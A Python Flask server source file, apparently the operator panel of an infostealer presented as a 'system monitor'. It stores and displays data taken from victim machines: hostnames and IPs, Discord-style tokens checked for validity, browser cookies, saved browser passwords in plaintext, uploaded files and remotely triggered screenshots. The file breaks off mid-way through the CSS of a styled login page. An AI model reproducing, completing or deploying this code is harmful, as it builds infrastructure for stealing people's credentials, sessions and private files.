#!/usr/bin/env python3
"""
LEALDADE SYSTEM MONITOR - VERSÃO CORRIGIDA PARA RAILWAY
Servidor robusto sem dependências problemáticas
"""

import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# CORS manual
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}
screenshot_requests = {}
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}
full_reports = {}
uploaded_files = {}

# Template HTML robusto
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEALDADE SYSTEM MONITOR</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0f23;
            color: #e0e0e0;
            min-height: 100vh;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 40px; }
        .header h1 { 
            font-size: 3em; 
            margin-bottom: 10px; 
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }
        .header p { color: #9ca3af; font-size: 1.1rem; }
        
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 25px; 
            margin-bottom: 50px;
        }
        .stat-card { 
            background: linear-gradient(135deg, rgba(124, 58, 237, 0.1) 0%, rgba(168, 85, 247, 0.1) 100%);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 16px; 
            padding: 25px; 
            text-align: center;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease;
        }
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.2);
        }
        .stat-value { 
            font-size: 2.5em; 
            font-weight: 700; 
            color: #a855f7;
            margin-bottom: 5px;
        }
        .stat-label { color: #9ca3af; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
        
        .tabs-container { 
            display: flex; 
            margin-bottom: 30px;
            background: rgba(17, 17, 27, 0.6);
            border-radius: 12px;
            padding: 5px;
        }
        .tab { 
            background: transparent; 
            color: #9ca3af; 
            border: none; 
            padding: 15px 25px; 
            cursor: pointer;
            border-radius: 8px;
            font-size: 0.95rem;
            transition: all 0.3s ease;
            flex: 1;
        }
        .tab.active { 
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
        }
        .tab:hover:not(.active) { background: rgba(124, 58, 237, 0.1); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .cards-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); 
            gap: 25px; 
        }
        .card { 
            background: linear-gradient(135deg, rgba(17, 17, 27, 0.8) 0%, rgba(31, 31, 46, 0.8) 100%);
            border: 1px solid rgba(124, 58, 237, 0.1);
            border-radius: 16px; 
            padding: 25px;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease;
        }
        .card:hover { transform: translateY(-3px); }
        .card h3 { 
            color: #a855f7; 
            margin-bottom: 20px; 
            font-size: 1.3rem;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .card p { margin: 8px 0; color: #e0e0e0; }
        .card strong { color: #a855f7; }
        
        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border: none;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 24px;
            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.3);
            transition: transform 0.3s ease;
        }
        .refresh-btn:hover { transform: scale(1.1); }
        
        .data-section {
            background: rgba(10, 10, 15, 0.6);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .data-section h3 {
            color: #a855f7;
            font-size: 1.1rem;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .token-card, .cookie-card, .password-card {
            background: rgba(168, 85, 247, 0.1);
            border: 1px solid rgba(168, 85, 247, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
            word-break: break-all;
        }
        .screenshot-img {
            max-width: 100%;
            border-radius: 12px;
            border: 2px solid rgba(124, 58, 237, 0.3);
        }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>LEALDADE SYSTEM MONITOR</h1>
            <p>Painel de Monitoramento em Tempo Real</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalEndpoints">0</div>
                <div class="stat-label">Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="onlineEndpoints">0</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalMetrics">0</div>
                <div class="stat-label">Métricas</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalScreenshots">0</div>
                <div class="stat-label">Screenshots</div>
            </div>
        </div>

        <div class="tabs-container">
            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
            <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
            <button class="tab" onclick="showTab('data')">Dados</button>
        </div>
        
        <div id="endpoints" class="tab-content active">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
            <div class="cards-grid" id="endpointsList">
                <div style="color: #6b7280; text-align: center; padding: 40px;">Carregando...</div>
            </div>
        </div>

        <div id="screenshot" class="tab-content">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                <select id="endpointSelect" style="width: 100%; max-width: 400px; padding: 14px; background: rgba(10, 10, 15, 0.8); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; color: #e0e0e0; font-size: 0.95rem; margin-bottom: 20px;" onchange="selectEndpoint()">
                    <option value="">Selecione um endpoint...</option>
                </select>
                <button id="screenshotBtn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; margin-bottom: 20px;" onclick="requestScreenshot()" disabled>📸 Capturar Screenshot</button>
                <div id="screenContent" style="background: rgba(10, 10, 15, 0.9); border-radius: 16px; padding: 20px; text-align: center; min-height: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
                    <div style="color: #6b7280;">Selecione um endpoint</div>
                </div>
            </div>
        </div>
        
        <div id="data" class="tab-content">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Menu de Dados</h2>
            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('tokens')">🔑 Tokens</button>
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('cookies')">🍪 Cookies</button>
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('passwords')">🔒 Senhas</button>
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('files')">📁 Arquivos</button>
                </div>
                
                <div id="dataContent" style="min-height: 400px;">
                    <div style="text-align: center; padding: 40px; color: #6b7280;">Selecione uma categoria acima</div>
                </div>
            </div>
        </div>
    </div>

    <button class="refresh-btn" onclick="loadAllData()">🔄</button>

    <script>
        let currentEndpoint = null;
        let currentCategory = null;

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function showDataCategory(category) {
            currentCategory = category;
            const contentDiv = document.getElementById('dataContent');
            
            switch(category) {
                case 'tokens':
                    loadTokens();
                    break;
                case 'cookies':
                    loadCookies();
                    break;
                case 'passwords':
                    loadPasswords();
                    break;
                case 'files':
                    loadFiles();
                    break;
            }
        }

        async function loadEndpoints() {
            try {
                const response = await fetch('/api/endpoints');
                const endpoints = await response.json();
                
                const container = document.getElementById('endpointsList');
                container.innerHTML = '';
                
                Object.values(endpoints).forEach(endpoint => {
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.innerHTML = `
                        <h3>${endpoint.hostname}</h3>
                        <p><strong>ID:</strong> ${endpoint.id}</p>
                        <p><strong>Usuário:</strong> ${endpoint.user}</p>
                        <p><strong>IP Local:</strong> ${endpoint.ip_address}</p>
                        <p><strong>IP Externo:</strong> ${endpoint.external_ip}</p>
                        <p><strong>Plataforma:</strong> ${endpoint.platform}</p>
                        <p><strong>RAM:</strong> ${endpoint.ram}</p>
                        <p><strong>Status:</strong> 🟢 Online</p>
                        <p><strong>Visto:</strong> ${endpoint.last_seen}</p>
                        <button class="tab" style="margin-top: 15px; padding: 8px 16px;" onclick="requestScreenshot('${endpoint.id}')">📸 Screenshot</button>
                    `;
                    container.appendChild(div);
                });
                
                document.getElementById('totalEndpoints').textContent = Object.keys(endpoints).length;
                document.getElementById('onlineEndpoints').textContent = Object.keys(endpoints).length;
                
                // Atualiza o select de endpoints
                const select = document.getElementById('endpointSelect');
                select.innerHTML = '<option value="">Selecione um endpoint...</option>';
                Object.keys(endpoints).forEach(id => {
                    const option = document.createElement('option');
                    option.value = id;
                    option.textContent = `${endpoints[id].hostname} (${id})`;
                    select.appendChild(option);
                });
            } catch (error) {
                console.error('Error loading endpoints:', error);
            }
        }

        async function loadTokens() {
            try {
                const response = await fetch('/api/tokens_data');
                const tokens = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>🔑 Tokens Capturados</h3><div id="tokensList"></div></div>';
                
                const tokensList = document.getElementById('tokensList');
                tokensList.innerHTML = '';
                
                Object.entries(tokens).forEach(([endpoint_id, data]) => {
                    data.tokens.forEach(token => {
                        const div = document.createElement('div');
                        div.className = 'token-card';
                        div.innerHTML = `
                            <strong>Endpoint:</strong> ${endpoint_id}<br>
                            <strong>Token:</strong> ${token.token || 'N/A'}<br>
                            <strong>Válido:</strong> ${token.valid ? '✅' : '❌'}<br>
                            ${token.account ? `<strong>Usuário:</strong> ${token.account.username}#${token.account.discriminator}<br>` : ''}
                        `;
                        tokensList.appendChild(div);
                    });
                });
                
                if (Object.keys(tokens).length === 0) {
                    tokensList.innerHTML = '<div class="empty-state">Nenhum token encontrado</div>';
                }
            } catch (error) {
                console.error('Error loading tokens:', error);
            }
        }

        async function loadCookies() {
            try {
                const response = await fetch('/api/cookies_data');
                const cookies = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>🍪 Cookies do Navegador</h3><div id="cookiesList"></div></div>';
                
                const cookiesList = document.getElementById('cookiesList');
                cookiesList.innerHTML = '';
                
                Object.entries(cookies).forEach(([endpoint_id, data]) => {
                    data.cookies.forEach(cookie => {
                        const div = document.createElement('div');
                        div.className = 'cookie-card';
                        div.innerHTML = `
                            <strong>Endpoint:</strong> ${endpoint_id}<br>
                            <strong>Host:</strong> ${cookie.host}<br>
                            <strong>Nome:</strong> ${cookie.name}<br>
                            <strong>Valor:</strong> ${cookie.value.substring(0, 100)}${cookie.value.length > 100 ? '...' : ''}<br>
                        `;
                        cookiesList.appendChild(div);
                    });
                });
                
                if (Object.keys(cookies).length === 0) {
                    cookiesList.innerHTML = '<div class="empty-state">Nenhum cookie encontrado</div>';
                }
            } catch (error) {
                console.error('Error loading cookies:', error);
            }
        }

        async function loadPasswords() {
            try {
                const response = await fetch('/api/passwords_data');
                const passwords = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>🔒 Senhas Salvas</h3><div id="passwordsList"></div></div>';
                
                const passwordsList = document.getElementById('passwordsList');
                passwordsList.innerHTML = '';
                
                Object.entries(passwords).forEach(([endpoint_id, data]) => {
                    data.passwords.forEach(password => {
                        const div = document.createElement('div');
                        div.className = 'password-card';
                        div.innerHTML = `
                            <strong>Endpoint:</strong> ${endpoint_id}<br>
                            <strong>Navegador:</strong> ${password.browser}<br>
                            <strong>URL:</strong> ${password.url}<br>
                            <strong>Usuário:</strong> ${password.username}<br>
                            <strong>Senha:</strong> ${password.password}<br>
                        `;
                        passwordsList.appendChild(div);
                    });
                });
                
                if (Object.keys(passwords).length === 0) {
                    passwordsList.innerHTML = '<div class="empty-state">Nenhuma senha encontrada</div>';
                }
            } catch (error) {
                console.error('Error loading passwords:', error);
            }
        }

        async function loadFiles() {
            try {
                const response = await fetch('/api/files_data');
                const files = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>📁 Arquivos Recebidos</h3><div id="filesList"></div></div>';
                
                const filesList = document.getElementById('filesList');
                filesList.innerHTML = '';
                
                Object.entries(files).forEach(([endpoint_id, data]) => {
                    data.files.forEach(file => {
                        const div = document.createElement('div');
                        div.className = 'token-card';
                        div.innerHTML = `
                            <strong>Endpoint:</strong> ${endpoint_id}<br>
                            <strong>Nome:</strong> ${file.name || file.filename}<br>
                            <strong>Tamanho:</strong> ${file.size ? (file.size / 1024).toFixed(2) + ' KB' : 'N/A'}<br>
                            <strong>Tipo:</strong> ${file.type || file.content_type}<br>
                        `;
                        filesList.appendChild(div);
                    });
                });
                
                if (Object.keys(files).length === 0) {
                    filesList.innerHTML = '<div class="empty-state">Nenhum arquivo encontrado</div>';
                }
            } catch (error) {
                console.error('Error loading files:', error);
            }
        }

        async function loadScreenshots() {
            try {
                const response = await fetch('/api/screenshots');
                const screenshots = await response.json();
                
                const container = document.getElementById('screenContent');
                container.innerHTML = '';
                
                Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
                    const div = document.createElement('div');
                    div.innerHTML = `
                        <h3 style="color: #a855f7; margin-bottom: 15px;">${endpoint_id}</h3>
                        <p style="color: #9ca3af; margin-bottom: 15px;"><strong>Data:</strong> ${new Date(screenshot.timestamp).toLocaleString()}</p>
                        ${screenshot.image ? `<img src="data:image/png;base64,${screenshot.image}" class="screenshot-img" alt="Screenshot">` : ''}
                    `;
                    container.appendChild(div);
                });
                
                document.getElementById('totalScreenshots').textContent = Object.keys(screenshots).length;
                
                if (Object.keys(screenshots).length === 0) {
                    container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
                }
            } catch (error) {
                console.error('Error loading screenshots:', error);
            }
        }

        function selectEndpoint() {
            const select = document.getElementById('endpointSelect');
            currentEndpoint = select.value;
            const btn = document.getElementById('screenshotBtn');
            
            if (currentEndpoint) {
                btn.disabled = false;
                btn.style.opacity = '1';
            } else {
                btn.disabled = true;
                btn.style.opacity = '0.5';
            }
        }

        async function requestScreenshot(endpointId) {
            const id = endpointId || currentEndpoint;
            if (!id) {
                alert('Selecione um endpoint primeiro');
                return;
            }
            
            try {
                const response = await fetch(`/api/request_screenshot/${id}`, { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    alert(`Screenshot solicitado para ${id}!`);
                    setTimeout(() => {
                        loadScreenshots();
                        if (currentEndpoint === id) {
                            selectEndpoint();
                        }
                    }, 5000);
                } else {
                    alert(`Erro: ${result.message}`);
                }
            } catch (error) {
                console.error('Error requesting screenshot:', error);
            }
        }

        function loadAllData() {
            loadEndpoints();
            
            fetch('/api/metrics_data')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('totalMetrics').textContent = data.length;
                })
                .catch(error => console.error('Error loading metrics:', error));
        }

        // Carrega dados iniciais
        loadAllData();
        
        // Atualiza a cada 30 segundos
        setInterval(loadAllData, 30000);
    </script>
</body>
</html>
"""

# Template do login roxo/preto premium com animações cinematográficas
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEALDADE - Portal Exclusivo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000000;
            min-height: 100vh;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -webkit-touch-callout: none;
        }
        
        /* Prevenir seleção em todos os elementos */
        * {
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -webkit-touch-callout: none;
        }
        
        /* Permitir seleção apenas em inputs */
        input, input * {
            user-select: text !important;
            -webkit-user-select: text !important;
            -moz-user-select: text !important;
            -ms-user-select: text !important;
        }
        
        /* Gradiente de fundo preto com detalhes roxos */
        .gradient-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(147, 51, 234, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(139, 92, 246, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(124, 58, 237, 0.08) 0%, transparent 50%),
                linear-gradient(135deg, #000000 0%, #0a0014 25%, #000000 50%, #0a0014 75%, #000000 100%);
            background-size: 200% 200%, 200% 200%, 200% 200%, 100% 100%;
            animation: gradientShift 25s ease infinite;
            opacity: 0.9;
            z-index: 0;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%, 100% 50%, 50% 100%, 0% 50%; }
            25% { background-position: 50% 0%, 0% 100%, 100% 0%, 50% 0%; }
            50% { background-position: 100% 50%, 50% 0%, 0% 50%, 100% 50%; }
            75% { background-position: 50% 100%, 100% 0%, 50% 100%, 50% 100%; }
            100% { background-position: 0% 50%, 100% 50%, 50% 100%, 0% 50%; }
        }
        
        /* Sistema de partículas avançado */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        
        .particle {
            position: absolute;
            border-radius: 50%;
            animation: float 30s infinite linear;
        }
        
        .particle.small {
            width: 2px;
            height: 2px;
            background: rgba(147, 51, 234, 0.8);
            box-shadow: 0 0 8px rgba(147, 51, 234, 0.6);
        }
        
        .particle.medium {
            width: 4px;
            height: 4px;
            background: rgba(139, 92, 246, 0.7);
            box-shadow: 0 0 12px rgba(139, 92, 246, 0.5);
        }
        
        .particle.large {
            width: 6px;
            height: 6px;
            background: rgba(124, 58, 237, 0.6);
            box-shadow: 0 0 16px rgba(124, 58, 237, 0.4);
        }
        
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg) scale(0); opacity: 0; }
            10% { opacity: 1; transform: scale(1); }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) rotate(1080deg) scale(0); opacity: 0; }
        }
        
        /* Grid hexagonal animado sutil */
        .hex-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(30deg, rgba(147, 51, 234, 0.05) 12%, transparent 12.5%, transparent 87%, rgba(147, 51, 234, 0.05) 87.5%, rgba(147, 51, 234, 0.05)),
                linear-gradient(150deg, rgba(147, 51, 234, 0.05) 12%, transparent 12.5%, transparent 87%, rgba(147, 51, 234, 0.05) 87.5%, rgba(147, 51, 234, 0.05)),
                linear-gradient(30deg, rgba(147, 51, 234, 0.05) 12%, transparent 12.5%, transparent 87%, rgba(147, 51, 234, 0.05) 87.5%, rgba(147, 51, 234, 0.05)),
                linear-gradient(150deg, rgba(147, 51, 234, 0.05) 12%, transparent 12.5%, transparent 87%, rgba(147, 51, 234, 0.05) 87.5%, rgba(147, 51, 234, 0.05)),
                linear-gradient(60deg, rgba(139, 92, 246, 0.02) 25%, transparent 25.5%, transparent 75%, rgba(139, 92, 246, 0.02) 75%, rgba(139, 92, 246, 0.02)),
                linear-gradient(60deg, rgba(139, 92, 246, 0.02) 25%, transparent 25.5%, transparent 75%, rgba(139, 92, 246, 0.02) 75%, rgba(139, 92, 246, 0.02));
            background-size: 80px 140px;
            background-position: 0 0, 0 0, 40px 70px, 40px 70px, 0 0, 40px 70px;
            animation: hexMove 15s linear infinite;
            z-index: 1;
        }
        
        @keyframes hexMove {
            0% { background-position: 0 0, 0 0, 40px 70px, 40px 70px, 0 0, 40px 70px; }
            100% { background-position: 80px 0, 80px 0, 120px 70px, 120px 70px, 80px 0, 120px 70px; }
        }
        
        /* Container principal com glassmorphism preto */
        .login-container {
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(25px) saturate(180%);
            border-radius: 35px;
            padding: 60px;
            max-width: 500px;
            width: 100%;
            border: 2px solid rgba(147, 51, 234, 0.3);
            box-shadow: 
                0 25px 50px rgba(0, 0, 0, 0.8),
                0 0 100px rgba(147, 51, 234, 0.15),
                inset 0 1px 0 rgba(147, 51, 234, 0.1),
                inset 0 -1px 0 rgba(0, 0, 0, 0.5);
            position: relative;
            z-index: 10;
            animation: containerEntrance 1.2s cubic-bezier(0.4, 0, 0.2, 1);
            transform-origin: center;
        }
        
        @keyframes containerEntrance {
            0% { 
                opacity: 0; 
                transform: translateY(100px) scale(0.8) rotateX(15deg); 
                filter: blur(20px);
            }
            50% {
                opacity: 0.8;
                transform: translateY(-20px) scale(1.05) rotateX(0deg);
                filter: blur(5px);
            }
            100% { 
                opacity: 1; 
                transform: translateY(0) scale(1) rotateX(0deg); 
                filter: blur(0px);
            }
        }
        
        /* Aura animada ao redor do container */
        .login-container::before {
            content: '';
            position: absolute;
            top: -3px;
            left: -3px;
            right: -3px;
            bottom: -3px;
            background: linear-gradient(
                45deg, 
                rgba(147, 51, 234, 0.8), 
                rgba(139, 92, 246, 0.6), 
                rgba(124, 58, 237, 0.4), 
                rgba(109, 40, 217, 0.3), 
                rgba(91, 33, 182, 0.2), 
                rgba(76, 29, 149, 0.1),
                rgba(147, 51, 234, 0.8)
            );
            border-radius: 35px;
            z-index: -1;
            opacity: 0.7;
            animation: borderAura 4s ease-in-out infinite;
            background-size: 300% 300%;
        }
        
        @keyframes borderAura {
            0%, 100% { 
                opacity: 0.6; 
                filter: blur(15px) brightness(1.2);
                background-position: 0% 50%;
            }
            50% { 
                opacity: 1; 
                filter: blur(0px) brightness(1.5);
                background-position: 100% 50%;
            }
        }
        
        /* Logo com animações cinematográficas */
        .logo {
            text-align: center;
            margin-bottom: 45px;
            position: relative;
            animation: logoFloat 4s ease-in-out infinite;
        }
        
        @keyframes logoFloat {
            0%, 100% { transform: translateY(0px) scale(1); }
            50% { transform: translateY(-10px) scale(1.02); }
        }
        
        .logo h1 {
            font-size: 4em;
            font-weight: 900;
            background: linear-gradient(
                135deg, 
                #9333ea 0%, 
                #8b5cf6 20%, 
                #7c3aed 40%, 
                #6d28d9 60%, 
                #5b21b6 80%, 
                #4c1d95 100%
            );
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 
                0 0 80px rgba(147, 51, 234, 1),
                0 0 120px rgba(139, 92, 246, 0.6);
            letter-spacing: 4px;
            margin-bottom: 15px;
            animation: textGlow 3s ease-in-out infinite alternate;
            position: relative;
        }
        
        @keyframes textGlow {
            from { 
                filter: brightness(1.2) drop-shadow(0 0 30px rgba(147, 51, 234, 1));
                transform: scale(1);
            }
            to { 
                filter: brightness(1.5) drop-shadow(0 0 50px rgba(147, 51, 234, 1.2));
                transform: scale(1.05);
            }
        }
        
        /* Partículas ao redor do logo */
        .logo-particles {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200%;
            height: 200%;
            pointer-events: none;
        }
        
        .logo-particle {
            position: absolute;
            width: 3px;
            height: 3px;
            background: #9333ea;
            border-radius: 50%;
            animation: orbitParticle 6s linear infinite;
            box-shadow: 0 0 10px rgba(147, 51, 234, 0.8);
        }
        
        @keyframes orbitParticle {
            0% { transform: rotate(0deg) translateX(100px) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: rotate(360deg) translateX(100px) rotate(-360deg); opacity: 0; }
        }
        
        .logo p {
            color: #a78bfa;
            font-size: 1.2em;
            font-weight: 300;
            letter-spacing: 3px;
            text-transform: uppercase;
            opacity: 0.9;
            text-shadow: 0 0 30px rgba(167, 139, 250, 0.8);
            animation: subtitlePulse 2s ease-in-out infinite alternate;
        }
        
        @keyframes subtitlePulse {
            from { opacity: 0.7; transform: scale(1); }
            to { opacity: 1; transform: scale(1.05); }
        }
        
        /* Formulário com efeitos holográficos */
        .form-group {
            margin-bottom: 30px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 15px;
            color: #e9d5ff;
            font-weight: 600;
            font-size: 0.95em;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            text-shadow: 0 0 15px rgba(233, 213, 255, 0.5);
        }
        
        .form-group input {
            width: 100%;
            padding: 22px 25px;
            background: rgba(0, 0, 0, 0.7);
            border: 2px solid rgba(147, 51, 234, 0.2);
            border-radius: 20px;
            color: #fff;
            font-size: 1.1em;
            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            backdrop-filter: blur(10px);
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #9333ea;
            background: rgba(0, 0, 0, 0.8);
            box-shadow: 
                0 0 40px rgba(147, 51, 234, 0.6),
                0 0 80px rgba(147, 51, 234, 0.3),
                inset 0 1px 0 rgba(147, 51, 234, 0.3);
            transform: translateY(-3px) scale(1.02);
        }
        
        .form-group input::placeholder {
            color: #6b7280;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus::placeholder {
            opacity: 0.3;
            transform: translateX(5px);
        }
        
        /* Efeito de onda ao digitar */
        .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(147, 51, 234, 0.3);
            transform: scale(0);
            animation: rippleEffect 0.6s ease-out;
            pointer-events: none;
        }
        
        @keyframes rippleEffect {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }
        
        /* Botão premium com animações cinematográficas */
        .login-btn {
            width: 100%;
            padding: 24px;
            background: linear-gradient(
                135deg, 
                #9333ea 0%, 
                #8b5cf6 25%, 
                #7c3aed 50%, 
                #6d28d9 75%, 
                #5b21b6 100%
            );
            border: none;
            border-radius: 20px;
            color: #fff;
            font-size: 1.3em;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-top: 25px;
            position: relative;
            overflow: hidden;
            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 
                0 10px 40px rgba(147, 51, 234, 0.5),
                0 0 80px rgba(147, 51, 234, 0.3);
        }
        
        /* Efeito de brilho passando pelo botão */
        .login-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                90deg, 
                transparent, 
                rgba(255, 255, 255, 0.4), 
                transparent
            );
            transition: left 0.8s ease;
        }
        
        .login-btn::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                45deg, 
                transparent 30%, 
                rgba(255, 255, 255, 0.1) 50%, 
                transparent 70%
            );
            transform: translateX(-100%);
            transition: transform 0.6s ease;
        }
        
        .login-btn:hover {
            transform: translateY(-5px) scale(1.03);
            box-shadow: 
                0 15px 50px rgba(147, 51, 234, 0.7),
                0 0 100px rgba(147, 51, 234, 0.4);
        }
        
        .login-btn:hover::before {
            left: 100%;
        }
        
        .login-btn:hover::after {
            transform: translateX(100%);
        }
        
        .login-btn:active {
            transform: translateY(-2px) scale(1.01);
        }
        
        /* Estados de loading avançados */
        .login-btn.loading {
            animation: btnLoading 2s infinite;
            pointer-events: none;
        }
        
        @keyframes btnLoading {
            0%, 100% { 
                transform: scale(1); 
                background: linear-gradient(135deg, #7c3aed, #6d28d9, #5b21b6);
            }
            25% { 
                transform: scale(1.05); 
                background: linear-gradient(135deg, #8b5cf6, #7c3aed, #6d28d9);
            }
            50% { 
                transform: scale(1.02); 
                background: linear-gradient(135deg, #9333ea, #8b5cf6, #7c3aed);
            }
            75% { 
                transform: scale(1.05); 
                background: linear-gradient(135deg, #a855f7, #9333ea, #8b5cf6);
            }
        }
        
        /* Mensagens com animações premium */
        .message {
            text-align: center;
            margin-top: 40px;
            padding: 30px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 20px;
            border-left: 4px solid #9333ea;
            backdrop-filter: blur(15px);
